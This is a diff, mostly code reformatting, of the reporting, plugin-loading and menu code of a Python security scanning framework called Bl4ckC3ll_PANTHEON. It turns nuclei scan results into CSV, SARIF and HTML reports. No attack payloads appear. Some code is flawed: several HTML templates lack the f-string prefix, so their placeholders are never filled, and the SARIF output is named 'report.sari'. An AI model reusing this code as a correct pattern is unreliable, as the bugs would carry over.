dictionary\n         if not isinstance(nuclei_parsed, dict):\n-            logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n \n         # Critical findings\n         if nuclei_parsed.get(\"critical\"):\n-            findings.append(f\"[ALERT] {target}: {len(nuclei_parsed['critical'])} critical vulnerabilities\")\n+            findings.append(\n+                f\"[ALERT] {target}: {len(nuclei_parsed['critical'])} critical vulnerabilities\"\n+            )\n \n         # Security headers issues\n         headers = data.get(\"security_headers\", {})\n         if headers.get(\"security_score\", 100) < 50:\n             findings.append(f\"\ud83d\udd12 {target}: Poor security headers configuration\")\n@@ -6090,117 +7808,153 @@\n         if cors.get(\"risk_level\") in [\"high\", \"critical\"]:\n             findings.append(f\"\ud83c\udf10 {target}: Dangerous CORS configuration\")\n \n     return findings[:10]  # Limit to top 10 findings\n \n+\n def generate_csv_report(report_data: Dict[str, Any], report_dir: Path):\n     \"\"\"Generate CSV format report\"\"\"\n     import csv\n \n     # Vulnerabilities CSV\n     vuln_csv = report_dir / \"vulnerabilities.csv\"\n-    with open(vuln_csv, 'w', newline='', encoding='utf-8') as f:\n+    with open(vuln_csv, \"w\", newline=\"\", encoding=\"utf-8\") as f:\n         writer = csv.writer(f)\n-        writer.writerow(['Target', 'Vulnerability', 'Severity', 'Description', 'Template'])\n+        writer.writerow(\n+            [\"Target\", \"Vulnerability\", \"Severity\", \"Description\", \"Template\"]\n+        )\n \n         for target, data in report_data[\"vuln_scan_results\"].items():\n             # Safety check: ensure data is a dictionary\n             if not isinstance(data, dict):\n-                logger.log(f\"Warning: data for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+                logger.log(\n+                    f\"Warning: data for target {target} is not a dictionary, skipping\",\n+                    \"DEBUG\",\n+                )\n                 continue\n-                \n+\n             nuclei_parsed = data.get(\"nuclei_parsed\", {})\n-            \n+\n             # Safety check: ensure nuclei_parsed is a dictionary\n             if not isinstance(nuclei_parsed, dict):\n-                logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+                logger.log(\n+                    f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                    \"DEBUG\",\n+                )\n                 continue\n-                \n+\n             for severity, findings in nuclei_parsed.items():\n                 if not isinstance(findings, (list, tuple)):\n                     continue\n                 for finding in findings:\n                     info = finding.get(\"info\", {})\n-                    writer.writerow([\n-                        target,\n-                        info.get(\"name\", \"Unknown\"),\n-                        severity.upper(),\n-                        info.get(\"description\", \"\"),\n-                        finding.get(\"template-id\", \"\")\n-                    ])\n+                    writer.writerow(\n+                        [\n+                            target,\n+                            info.get(\"name\", \"Unknown\"),\n+                            severity.upper(),\n+                            info.get(\"description\", \"\"),\n+                            finding.get(\"template-id\", \"\"),\n+                        ]\n+                    )\n+\n \n def generate_sarif_report(report_data: Dict[str, Any], report_dir: Path):\n     \"\"\"Generate SARIF format report for integration with security tools\"\"\"\n     sarif_data = {\n         \"version\": \"2.1.0\",\n         \"$schema\": \"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json\",\n-        \"runs\": [{\n-            \"tool\": {\n-                \"driver\": {\n-                    \"name\": \"Bl4ckC3ll_PANTHEON\",\n-                    \"version\": \"9.0.0-enhanced\",\n-                    \"informationUri\": \"https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON\"\n-                }\n-            },\n-            \"results\": []\n-        }]\n+        \"runs\": [\n+            {\n+                \"tool\": {\n+                    \"driver\": {\n+                        \"name\": \"Bl4ckC3ll_PANTHEON\",\n+                        \"version\": \"9.0.0-enhanced\",\n+                        \"informationUri\": \"https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON\",\n+                    }\n+                },\n+                \"results\": [],\n+            }\n+        ],\n     }\n \n     for target, data in report_data[\"vuln_scan_results\"].items():\n         # Safety check: ensure data is a dictionary\n         if not isinstance(data, dict):\n-            logger.log(f\"Warning: data for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: data for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n-            \n+\n         nuclei_parsed = data.get(\"nuclei_parsed\", {})\n-        \n+\n         # Safety check: ensure nuclei_parsed is a dictionary\n         if not isinstance(nuclei_parsed, dict):\n-            logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n-            \n+\n         for severity, findings in nuclei_parsed.items():\n             if not isinstance(findings, (list, tuple)):\n                 continue\n             for finding in findings:\n                 info = finding.get(\"info\", {})\n                 result = {\n                     \"ruleId\": finding.get(\"template-id\", \"unknown\"),\n                     \"message\": {\"text\": info.get(\"description\", \"No description\")},\n                     \"level\": map_severity_to_sarif(severity),\n-                    \"locations\": [{\n-                        \"physicalLocation\": {\n-                            \"artifactLocation\": {\"uri\": finding.get(\"matched-at\", target)}\n+                    \"locations\": [\n+                        {\n+                            \"physicalLocation\": {\n+                                \"artifactLocation\": {\n+                                    \"uri\": finding.get(\"matched-at\", target)\n+                                }\n+                            }\n                         }\n-                    }]\n+                    ],\n                 }\n                 sarif_data[\"runs\"][0][\"results\"].append(result)\n \n     atomic_write(report_dir / \"report.sari\", json.dumps(sarif_data, indent=2))\n+\n \n def map_severity_to_sarif(severity: str) -> str:\n     \"\"\"Map our severity levels to SARIF levels\"\"\"\n     mapping = {\n         \"critical\": \"error\",\n         \"high\": \"error\",\n         \"medium\": \"warning\",\n         \"low\": \"note\",\n-        \"info\": \"note\"\n+        \"info\": \"note\",\n     }\n     return mapping.get(severity, \"note\")\n \n+\n def generate_enhanced_html_report(report_data: Dict[str, Any], report_dir: Path):\n     \"\"\"Generate enhanced HTML report with improved styling\"\"\"\n+\n     # HTML template with red/yellow color scheme\n     def esc(s: str) -> str:\n         return str(s).replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\")\n \n     def html_recon() -> str:\n         chunks: List[str] = []\n         for target, data in report_data[\"recon_results\"].items():\n-            subs = \"\".join(f\"<li>{esc(x)}</li>\" for x in data[\"subdomains\"]) or \"<li>None</li>\"\n-            ports = \"\".join(f\"<li><span class='port'>{esc(p['host'])}:{p['port']}/{p['proto']}</span></li>\" for p in data[\"open_ports\"]) or \"<li>None</li>\"\n+            subs = (\n+                \"\".join(f\"<li>{esc(x)}</li>\" for x in data[\"subdomains\"])\n+                or \"<li>None</li>\"\n+            )\n+            ports = (\n+                \"\".join(\n+                    f\"<li><span class='port'>{esc(p['host'])}:{p['port']}/{p['proto']}</span></li>\"\n+                    for p in data[\"open_ports\"]\n+                )\n+                or \"<li>None</li>\"\n+            )\n \n             # Technology stack\n             tech_info = \"\"\n             if data.get(\"technology_stack\"):\n                 tech_info = f\"<h5>[TECH] Technology Stack</h5><pre>{esc(json.dumps(data['technology_stack'], indent=2)[:500])}</pre>\"\n@@ -6208,13 +7962,16 @@\n             # Network info\n             network_info = \"\"\n             if data.get(\"network_info\"):\n                 network_info = \"<h5>\ud83c\udf10 Network Information</h5>\"\n                 for key, value in data[\"network_info\"].items():\n-                    network_info += f\"<h6>{esc(key.title())}</h6><pre>{esc(str(value)[:300])}</pre>\"\n-\n-            chunks.append(\"\"\"\n+                    network_info += (\n+                        f\"<h6>{esc(key.title())}</h6><pre>{esc(str(value)[:300])}</pre>\"\n+                    )\n+\n+            chunks.append(\n+                \"\"\"\n             <div class=\"target-section\">\n               <h3>[TARGET] Target: {esc(target)}</h3>\n               <div class=\"info-grid\">\n                 <div class=\"info-box\">\n                   <h4>[RECON] Subdomains ({len(data['subdomains'])})</h4>\n@@ -6225,33 +7982,44 @@\n                   <ul class=\"port-list\">{ports}</ul>\n                 </div>\n               </div>\n               {tech_info}\n               {network_info}\n-            </div>\"\"\")\n+            </div>\"\"\"\n+            )\n         return \"\\n\".join(chunks)\n \n     def html_vuln() -> str:\n         chunks: List[str] = []\n         for target, data in report_data[\"vuln_scan_results\"].items():\n             # Safety check: ensure data is a dictionary\n             if not isinstance(data, dict):\n-                logger.log(f\"Warning: data for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+                logger.log(\n+                    f\"Warning: data for target {target} is not a dictionary, skipping\",\n+                    \"DEBUG\",\n+                )\n                 continue\n-                \n+\n             nuclei_parsed = data.get(\"nuclei_parsed\", {})\n-            \n+\n             # Safety check: ensure nuclei_parsed is a dictionary\n             if not isinstance(nuclei_parsed, dict):\n-                logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+                logger.log(\n+                    f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                    \"DEBUG\",\n+                )\n                 continue\n-                \n+\n             risk_score = data.get(\"risk_score\", 0)\n \n             # Vulnerability summary\n             vuln_summary = \"\"\n-            total_vulns = sum(len(findings) for findings in nuclei_parsed.values() if isinstance(findings, (list, tuple)))\n+            total_vulns = sum(\n+                len(findings)\n+                for findings in nuclei_parsed.values()\n+                if isinstance(findings, (list, tuple))\n+            )\n             if total_vulns > 0:\n                 vuln_summary = f\"\"\"\n                 <div class=\"vuln-summary\">\n                   <h4>[REPORT] Vulnerability Summary</h4>\n                   <div class=\"severity-grid\">\n@@ -6272,11 +8040,13 @@\n                     findings_html += \"<ul class='findings-list'>\"\n                     for finding in findings[:10]:  # Limit to first 10 per severity\n                         info = finding.get(\"info\", {})\n                         findings_html += f\"<li><strong>{esc(info.get('name', 'Unknown'))}</strong>: {esc(info.get('description', 'No description')[:100])}</li>\"\n                     if len(findings) > 10:\n-                        findings_html += f\"<li><em>... and {len(findings) - 10} more</em></li>\"\n+                        findings_html += (\n+                            f\"<li><em>... and {len(findings) - 10} more</em></li>\"\n+                        )\n                     findings_html += \"</ul>\"\n \n             # Additional security checks\n             additional_checks = \"\"\n             if data.get(\"security_headers\"):\n@@ -6289,17 +8059,19 @@\n             if data.get(\"cors_analysis\"):\n                 cors = data[\"cors_analysis\"]\n                 risk = cors.get(\"risk_level\", \"unknown\")\n                 additional_checks += f\"<h5>\ud83c\udf10 CORS Analysis: <span class='risk-{risk}'>{risk.title()}</span></h5>\"\n \n-            chunks.append(\"\"\"\n+            chunks.append(\n+                \"\"\"\n             <div class=\"target-section\">\n               <h3>[TARGET] Target: {esc(target)}</h3>\n               {vuln_summary}\n               {findings_html}\n               {additional_checks}\n-            </div>\"\"\")\n+            </div>\"\"\"\n+            )\n         return \"\\n\".join(chunks)\n \n     # Executive summary HTML\n     exec_summary = report_data.get(\"executive_summary\", {})\n     risk_assessment = report_data.get(\"risk_assessment\", {})\n@@ -6497,34 +8269,40 @@\n </html>\n \"\"\"\n     atomic_write(report_dir / \"report.html\", html)\n     logger.log(\"Enhanced HTML report with red/yellow theme generated\", \"SUCCESS\")\n \n-def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, Any], report_dir: Path):\n+\n+def generate_enhanced_intelligent_html_report(\n+    enhanced_report_data: Dict[str, Any], report_dir: Path\n+):\n     \"\"\"Generate enhanced HTML report with intelligent analysis data\"\"\"\n     try:\n+\n         def esc(s: str) -> str:\n-            return str(s).replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\")\n-        \n+            return (\n+                str(s).replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\")\n+            )\n+\n         # Extract key data from enhanced report\n         metadata = enhanced_report_data.get(\"report_metadata\", {})\n         exec_summary = enhanced_report_data.get(\"executive_summary\", {})\n         risk_assessment = enhanced_report_data.get(\"risk_assessment\", {})\n         threat_intel = enhanced_report_data.get(\"threat_intelligence\", {})\n         vuln_analysis = enhanced_report_data.get(\"vulnerability_analysis\", {})\n         exec_narrative = enhanced_report_data.get(\"executive_narrative\", {})\n         technical_analysis = enhanced_report_data.get(\"technical_analysis\", {})\n         remediation_roadmap = enhanced_report_data.get(\"remediation_roadmap\", {})\n         recommendations = enhanced_report_data.get(\"recommendations\", {})\n-        \n+\n         # Generate executive summary section\n         def generate_executive_summary_html() -> str:\n             scan_overview = exec_summary.get(\"scan_overview\", {})\n             security_posture = exec_summary.get(\"security_posture\", {})\n             business_impact = exec_summary.get(\"business_impact\", {})\n             key_insights = exec_summary.get(\"key_insights\", [])\n-            \n+\n             html = f\"\"\"\n             <div class=\"executive-summary\">\n                 <h2>\ud83c\udfaf Executive Summary</h2>\n                 \n                 <div class=\"summary-grid\">\n@@ -6557,36 +8335,40 @@\n                 \n                 <div class=\"key-insights\">\n                     <h3>\ud83d\udd0d Key Intelligence Insights</h3>\n                     <ul class=\"insights-list\">\n             \"\"\"\n-            \n+\n             for insight in key_insights[:5]:  # Top 5 insights\n-                priority_class = insight.get('priority', 'medium').lower()\n+                priority_class = insight.get(\"priority\", \"medium\").lower()\n                 html += f\"\"\"\n                         <li class=\"insight insight-{priority_class}\">\n                             <strong>{esc(insight.get('title', 'Unknown'))}</strong>\n                             <p>{esc(insight.get('description', ''))}</p>\n                             <em>Business Impact: {esc(insight.get('business_implication', ''))}</em>\n                         </li>\n                 \"\"\"\n-            \n+\n             html += \"\"\"\n                     </ul>\n                 </div>\n             </div>\n             \"\"\"\n             return html\n-        \n+\n         # Generate threat intelligence section\n         def generate_threat_intel_html() -> str:\n             if not threat_intel:\n                 return \"<div class='section'><h3>\ud83d\udee1\ufe0f Threat Intelligence</h3><p>No threat intelligence data available</p></div>\"\n-            \n+\n             reputation_score = threat_intel.get(\"reputation_score\", 100)\n-            reputation_class = \"high\" if reputation_score >= 80 else \"medium\" if reputation_score >= 60 else \"low\"\n-            \n+            reputation_class = (\n+                \"high\"\n+                if reputation_score >= 80\n+                else \"medium\" if reputation_score >= 60 else \"low\"\n+            )\n+\n             html = f\"\"\"\n             <div class=\"section\">\n                 <h2>\ud83d\udee1\ufe0f Threat Intelligence Analysis</h2>\n                 \n                 <div class=\"threat-overview\">\n@@ -6606,41 +8388,41 @@\n                     </div>\n                 </div>\n             </div>\n             \"\"\"\n             return html\n-        \n+\n         # Generate vulnerability analysis section\n         def generate_vulnerability_analysis_html() -> str:\n             enhanced_vulns = vuln_analysis.get(\"enhanced_vulnerabilities\", [])\n             correlations = vuln_analysis.get(\"correlation_analysis\", {})\n             attack_surface = vuln_analysis.get(\"attack_surface_analysis\", {})\n-            \n+\n             html = f\"\"\"\n             <div class=\"section\">\n                 <h2>\ud83d\udd0d Advanced Vulnerability Analysis</h2>\n                 \n                 <div class=\"analysis-grid\">\n                     <div class=\"analysis-box\">\n                         <h3>\ud83d\udcca Attack Vector Distribution</h3>\n             \"\"\"\n-            \n+\n             # Attack vector distribution from risk assessment\n             vector_dist = risk_assessment.get(\"attack_vector_distribution\", {})\n             if vector_dist:\n                 for vector, data in vector_dist.items():\n                     count = data.get(\"count\", 0)\n                     percentage = data.get(\"percentage\", 0)\n                     html += f\"<p><strong>{esc(vector.replace('_', ' ').title())}:</strong> {count} ({percentage}%)</p>\"\n-            \n+\n             html += \"\"\"\n                     </div>\n                     \n                     <div class=\"analysis-box\">\n                         <h3>\ud83d\udd17 Attack Chain Analysis</h3>\n             \"\"\"\n-            \n+\n             # Attack chains from correlations\n             attack_chains = correlations.get(\"attack_chains\", [])\n             if attack_chains:\n                 for chain in attack_chains[:3]:  # Top 3 chains\n                     html += f\"\"\"\n@@ -6650,19 +8432,19 @@\n                         <p>Risk Multiplier: {chain.get('risk_multiplier', 1.0):.1f}x</p>\n                     </div>\n                     \"\"\"\n             else:\n                 html += \"<p>No significant attack chains identified</p>\"\n-            \n+\n             html += \"\"\"\n                     </div>\n                 </div>\n                 \n                 <div class=\"analysis-box\">\n                     <h3>\ud83c\udfaf Attack Surface Metrics</h3>\n             \"\"\"\n-            \n+\n             surface_metrics = attack_surface.get(\"surface_metrics\", {})\n             if surface_metrics:\n                 html += f\"\"\"\n                 <div class=\"metrics-grid\">\n                     <div class=\"metric\">\n@@ -6677,43 +8459,43 @@\n                         <span class=\"metric-value\">{surface_metrics.get('vulnerability_density', 0):.1f}</span>\n                         <span class=\"metric-label\">Vuln/Target</span>\n                     </div>\n                 </div>\n                 \"\"\"\n-            \n+\n             html += \"\"\"\n                 </div>\n             </div>\n             \"\"\"\n             return html\n-        \n+\n         # Generate executive narrative section\n         def generate_narrative_html() -> str:\n             storyline = exec_narrative.get(\"executive_storyline\", [])\n             key_messages = exec_narrative.get(\"key_messages\", [])\n             board_summary = exec_narrative.get(\"board_summary\", {})\n-            \n+\n             if not storyline:\n                 return \"\"\n-            \n+\n             html = \"\"\"\n             <div class=\"section\">\n                 <h2>\ud83d\udccb Executive Narrative</h2>\n                 \n                 <div class=\"narrative-container\">\n             \"\"\"\n-            \n+\n             for section in storyline:\n                 section_name = section.get(\"section\", \"Unknown\")\n                 content = section.get(\"content\", \"\")\n                 html += f\"\"\"\n                 <div class=\"narrative-section\">\n                     <h3>{esc(section_name)}</h3>\n                     <p>{esc(content)}</p>\n                 </div>\n                 \"\"\"\n-            \n+\n             # Board summary\n             if board_summary:\n                 html += f\"\"\"\n                 <div class=\"board-summary\">\n                     <h3>\ud83d\udcca Board-Level Summary</h3>\n@@ -6722,72 +8504,79 @@\n                         <p><strong>Timeline:</strong> {esc(board_summary.get('timeline', ''))}</p>\n                         <p><strong>Next Update:</strong> {esc(board_summary.get('next_board_update', ''))}</p>\n                     </div>\n                 </div>\n                 \"\"\"\n-            \n+\n             html += \"\"\"\n                 </div>\n             </div>\n             \"\"\"\n             return html\n-        \n+\n         # Generate remediation roadmap section\n         def generate_remediation_html() -> str:\n             if not remediation_roadmap:\n                 return \"\"\n-            \n+\n             html = \"\"\"\n             <div class=\"section\">\n                 <h2>\ud83d\ude80 Remediation Roadmap</h2>\n                 \n                 <div class=\"roadmap-container\">\n             \"\"\"\n-            \n-            roadmap_phases = [\"immediate_actions\", \"short_term\", \"medium_term\", \"long_term\"]\n+\n+            roadmap_phases = [\n+                \"immediate_actions\",\n+                \"short_term\",\n+                \"medium_term\",\n+                \"long_term\",\n+            ]\n             phase_names = {\n                 \"immediate_actions\": \"\ud83d\udea8 Immediate Actions (0-24h)\",\n                 \"short_term\": \"\ud83d\udd25 Short Term (1-7 days)\",\n                 \"medium_term\": \"\u26a1 Medium Term (1-4 weeks)\",\n-                \"long_term\": \"\ud83c\udfd7\ufe0f Long Term (1-3 months)\"\n+                \"long_term\": \"\ud83c\udfd7\ufe0f Long Term (1-3 months)\",\n             }\n-            \n+\n             for phase in roadmap_phases:\n                 phase_data = remediation_roadmap.get(phase, {})\n                 if not phase_data or not phase_data.get(\"actions\"):\n                     continue\n-                \n+\n                 html += f\"\"\"\n                 <div class=\"roadmap-phase\">\n                     <h3>{phase_names.get(phase, phase.title())}</h3>\n                     <p><strong>Timeline:</strong> {esc(phase_data.get('timeline', 'Unknown'))}</p>\n                     <p><strong>Success Criteria:</strong> {esc(phase_data.get('success_criteria', 'Unknown'))}</p>\n                     \n                     <div class=\"action-list\">\n                 \"\"\"\n-                \n-                for action in phase_data.get(\"actions\", [])[:5]:  # Top 5 actions per phase\n+\n+                for action in phase_data.get(\"actions\", [])[\n+                    :5\n+                ]:  # Top 5 actions per phase\n                     html += f\"\"\"\n                     <div class=\"action-item\">\n                         <strong>{esc(action.get('vulnerability', 'Unknown'))}</strong>\n                         <p>Target: {esc(action.get('target', 'Unknown'))}</p>\n                         <p>Effort: {esc(action.get('effort', 'Unknown'))}</p>\n                         <p class=\"justification\">{esc(action.get('justification', ''))}</p>\n                     </div>\n                     \"\"\"\n-                \n+\n                 html += \"\"\"\n                     </div>\n                 </div>\n                 \"\"\"\n-            \n+\n             html += \"\"\"\n                 </div>\n             </div>\n             \"\"\"\n             return html\n-        \n+\n         # Generate the main HTML structure\n         html_content = f\"\"\"<!DOCTYPE html>\n <html>\n <head>\n     <meta charset=\"utf-8\" />\n@@ -6996,44 +8785,44 @@\n         <div class=\"recommendations-grid\">\n             <div class=\"recommendation-category\">\n                 <h3>\ud83d\udea8 Immediate Actions</h3>\n                 <ul>\n         \"\"\"\n-        \n+\n         # Add immediate recommendations\n         immediate_actions = recommendations.get(\"immediate_actions\", [])\n         for action in immediate_actions[:5]:\n             html_content += f\"<li>{esc(action)}</li>\"\n-        \n+\n         html_content += \"\"\"\n                 </ul>\n             </div>\n             \n             <div class=\"recommendation-category\">\n                 <h3>\ud83c\udfd7\ufe0f Strategic Initiatives</h3>\n                 <ul>\n         \"\"\"\n-        \n+\n         # Add strategic recommendations\n         strategic_initiatives = recommendations.get(\"strategic_initiatives\", [])\n         for initiative in strategic_initiatives[:5]:\n             html_content += f\"<li>{esc(initiative)}</li>\"\n-        \n+\n         html_content += \"\"\"\n                 </ul>\n             </div>\n             \n             <div class=\"recommendation-category\">\n                 <h3>\ud83d\udcca Monitoring Improvements</h3>\n                 <ul>\n         \"\"\"\n-        \n+\n         # Add monitoring recommendations\n         monitoring_improvements = recommendations.get(\"monitoring_improvements\", [])\n         for improvement in monitoring_improvements[:5]:\n             html_content += f\"<li>{esc(improvement)}</li>\"\n-        \n+\n         html_content += f\"\"\"\n                 </ul>\n             </div>\n         </div>\n     </div>\n@@ -7053,15 +8842,15 @@\n         <p><strong>Bl4ckC3ll_PANTHEON</strong> - Intelligent Security Assessment Platform | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>\n     </div>\n </body>\n </html>\n         \"\"\"\n-        \n+\n         # Write the enhanced HTML report\n         atomic_write(report_dir / \"intelligent_report.html\", html_content)\n         logger.log(\"Enhanced intelligent HTML report generated successfully\", \"SUCCESS\")\n-        \n+\n     except Exception as e:\n         logger.log(f\"Enhanced intelligent HTML report generation failed: {e}\", \"ERROR\")\n         # Create a basic fallback HTML\n         fallback_html = f\"\"\"<!DOCTYPE html>\n <html>\n@@ -7072,30 +8861,33 @@\n <p>Timestamp: {datetime.now().isoformat()}</p>\n </body>\n </html>\"\"\"\n         atomic_write(report_dir / \"intelligent_report.html\", fallback_html)\n \n+\n # ---------- Plugin Management ----------\n @monitor_performance(\"plugin_loading\")\n def find_plugins() -> Dict[str, Any]:\n     \"\"\"Discover and return available plugins\"\"\"\n     return load_plugins()\n \n+\n def load_plugin(plugin_name: str) -> Any:\n     \"\"\"Load a specific plugin by name\"\"\"\n     plugin_file = PLUGINS_DIR / f\"{plugin_name}.py\"\n     if not plugin_file.exists():\n         raise FileNotFoundError(f\"Plugin not found: {plugin_name}\")\n-    \n+\n     try:\n         spec = importlib.util.spec_from_file_location(plugin_name, plugin_file)\n         if spec and spec.loader:\n             module = importlib.util.module_from_spec(spec)\n             spec.loader.exec_module(module)  # type: ignore\n             return module\n     except Exception as e:\n         raise ImportError(f\"Failed to load plugin {plugin_name}: {e}\")\n+\n \n @monitor_performance(\"plugin_loading\")\n def load_plugins() -> Dict[str, Any]:\n     plugins: Dict[str, Any] = {}\n     PLUGINS_DIR.mkdir(exist_ok=True)\n@@ -7106,17 +8898,25 @@\n             spec = importlib.util.spec_from_file_location(plugin_file.stem, plugin_file)\n             if spec and spec.loader:\n                 module = importlib.util.module_from_spec(spec)\n                 spec.loader.exec_module(module)  # type: ignore\n                 if hasattr(module, \"plugin_info\") and hasattr(module, \"execute\"):\n-                    plugins[plugin_file.stem] = {\"info\": module.plugin_info, \"execute\": module.execute, \"enabled\": True}\n+                    plugins[plugin_file.stem] = {\n+                        \"info\": module.plugin_info,\n+                        \"execute\": module.execute,\n+                        \"enabled\": True,\n+                    }\n                     logger.log(f\"Loaded plugin: {plugin_file.stem}\", \"INFO\")\n                 else:\n-                    logger.log(f\"Plugin missing required symbols: {plugin_file.stem}\", \"WARNING\")\n+                    logger.log(\n+                        f\"Plugin missing required symbols: {plugin_file.stem}\",\n+                        \"WARNING\",\n+                    )\n         except Exception as e:\n             logger.log(f\"Plugin load failed {plugin_file.stem}: {e}\", \"ERROR\")\n     return plugins\n+\n \n def create_plugin_template(plugin_name: str):\n     template = \"\"\"# Plugin: {plugin_name}\n # Provide 'plugin_info' and 'execute(run_dir: Path, env: Dict[str,str], cfg: Dict[str,Any])'\n from pathlib import Path\n@@ -7133,37 +8933,48 @@\n     out = run_dir / \"plugin_{plugin_name}.txt\"\n     out.write_text(\"Hello from plugin {plugin_name}\\\\n\")\n     print(f\"[PLUGIN] Wrote: {{out}}\")\n \"\"\"\n     atomic_write(PLUGINS_DIR / f\"{plugin_name}.py\", template)\n-    logger.log(f\"Plugin template created: {PLUGINS_DIR / (plugin_name + '.py')}\", \"SUCCESS\")\n-\n-def execute_plugin(plugin_name: str, run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+    logger.log(\n+        f\"Plugin template created: {PLUGINS_DIR / (plugin_name + '.py')}\", \"SUCCESS\"\n+    )\n+\n+\n+def execute_plugin(\n+    plugin_name: str, run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     plugins = load_plugins()\n     if plugin_name in plugins and plugins[plugin_name].get(\"enabled\", False):\n         try:\n             plugins[plugin_name][\"execute\"](run_dir, env, cfg)\n             logger.log(f\"Plugin executed: {plugin_name}\", \"SUCCESS\")\n         except Exception as e:\n             logger.log(f\"Plugin error {plugin_name}: {e}\", \"ERROR\")\n     else:\n         logger.log(f\"Plugin not found/enabled: {plugin_name}\", \"WARNING\")\n \n+\n # ---------- Menu ----------\n BANNER = r\"\"\"\n \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557      \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557\n \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2551\n \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551     \u2588\u2588\u2551\n \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551     \u2588\u2588\u2551\n \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n \"\"\"\n \n+\n def display_menu():\n-    print(\"\\n\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n-    print(\"\\033[91m\" + \"BL4CKC3LL_P4NTH30N - ENHANCED SECURITY TESTING FRAMEWORK\".center(80) + \"\\033[0m\")\n-    print(\"\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\n\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n+    print(\n+        \"\\033[91m\"\n+        + \"BL4CKC3LL_P4NTH30N - ENHANCED SECURITY TESTING FRAMEWORK\".center(80)\n+        + \"\\033[0m\"\n+    )\n+    print(\"\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n     print(\"\\033[93m1. [TARGET] Enhanced Target Management\\033[0m\")\n     print(\"\\033[93m2. [REFRESH] Refresh Sources + Merge Wordlists\\033[0m\")\n     print(\"\\033[93m3. [RECON] Enhanced Reconnaissance\\033[0m\")\n     print(\"\\033[93m4. [VULN] Advanced Vulnerability Scan\\033[0m\")\n     print(\"\\033[93m5. [FULL] Full Pipeline (Recon + Vuln + Report)\\033[0m\")\n@@ 